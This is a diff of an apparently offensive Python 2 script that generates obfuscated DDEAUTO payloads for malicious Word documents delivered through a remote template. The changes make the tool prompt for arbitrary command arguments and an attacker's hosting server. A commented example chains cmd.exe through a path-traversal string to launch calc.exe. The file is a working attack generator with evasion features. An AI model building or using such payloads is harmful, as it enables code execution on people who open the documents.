@@ -29,6 +29,11 @@ Obfuscation and evasion techniques inspired by @_staaldraad
 References:
 https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
 https://staaldraad.github.io/2017/10/23/msword-field-codes/
+
+Additional Thanks:
+@ryHanson
+@SecuritySift
+@GossiTheDog
 """
 
 def arg_parse():
@@ -55,30 +60,28 @@ def obfuscate_dde(payload):
 def gen_payload(obfuscate):
     # Prompt user for DDE payload
     payload = []
-    """
-    arg1 = raw_input("[-] Enter DDE payload argument #1:\n")
-    arg2 = raw_input("[-] Enter DDE payload argument #2:\n")
-    arg3 = raw_input("[-] Enter DDE payload argument #3 (press ENTER to omit):\n")
+    arg1 = raw_input("[-] Enter DDE payload argument #1: ")
+    arg2 = raw_input("[-] Enter DDE payload argument #2: ")
+    arg3 = raw_input("[-] Enter DDE payload argument #3 (press ENTER to omit): ")
 
     payload.append('DDEAUTO')
     payload.append(arg1)
     payload.append(arg2)
     payload.append(arg3)   
+    
     """
     # Example set of DDE arguments to form payload
-    payload.append('DDEAUTO')
-    payload.append('"C:\\\\Programs\\\\Microsoft\\\\Office\\\\MSWord.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\cmd.exe"')
-    payload.append('"/c calc.exe"')
-    payload.append('"for security reasons"')
+    "C:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\cmd.exe"
+    "/c calc.exe"
+    "for security reasons"
+    """
 
     # Obfuscate provided DDE payload (if enabled)
     if obfuscate:
         obfusc_payload = []
-        obfusc_payload.append(obfuscate_dde(payload[1]))
-        obfusc_payload.append(obfuscate_dde(payload[2]))
-        obfusc_payload.append(obfuscate_dde(payload[3]))
-        #obfusc_payload.append(' DDEAUTO { REF c } { REF d } { REF e } ')
-        #obfusc_payload = " ".join(obfusc_payload)
+        obfusc_payload.append(obfuscate_dde(payload[1].replace('\\\\','\\')))
+        obfusc_payload.append(obfuscate_dde(payload[2].replace('\\\\','\\')))
+        obfusc_payload.append(obfuscate_dde(payload[3].replace('\\\\','\\')))
     else:
         payload = " ".join(payload)
         obfusc_payload = payload
@@ -90,13 +93,13 @@ def gen_payload(obfuscate):
         print '[*] Obfuscated DDE payload: {}'.format(obfusc_payload)
 
     # Prompt user for server hosting payload Office document (referenced by 'template')
-    #targetsvr = raw_input("[-] Enter server URL (hosting payload Office file): ")
+    targetsvr = raw_input("[-] Enter server URL (hosting payload Office file): ")
     if obfuscate:
-        #targetsvr = targetsvr + '/payload-obfuscated-final.docx'
-        targetsvr = 'http://localhost:8000/payload-obfuscated-final.docx'
+        targetsvr = targetsvr + '/payload-obfuscated-final.docx'
+        #targetsvr = 'http://localhost:8000/payload-obfuscated-final.docx'
     else:
-        #targetsvr = targetsvr + '/payload-final.docx'
-        targetsvr = 'http://localhost:8000/payload-final.docx'
+        targetsvr = targetsvr + '/payload-final.docx'
+        #targetsvr = 'http://localhost:8000/payload-final.docx'
 
     return obfusc_payload, targetsvr
 
